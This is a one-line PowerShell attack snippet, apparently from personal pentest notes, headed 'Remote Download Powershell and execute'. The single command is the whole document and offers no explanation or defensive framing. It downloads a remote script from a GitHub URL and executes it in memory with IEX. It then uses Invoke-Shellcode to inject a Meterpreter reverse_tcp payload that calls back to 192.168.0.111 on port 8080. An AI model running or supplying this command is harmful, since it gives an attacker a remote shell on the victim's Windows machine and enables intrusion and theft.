# Remote Download Powershell and execute
IEX (New-Object Net.WebClient).DownloadString('https://github.com/cyberghostvn/pwsh/pwsh.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_tcp -Lhost 192.168.0.111 -Lport 8080 -Force
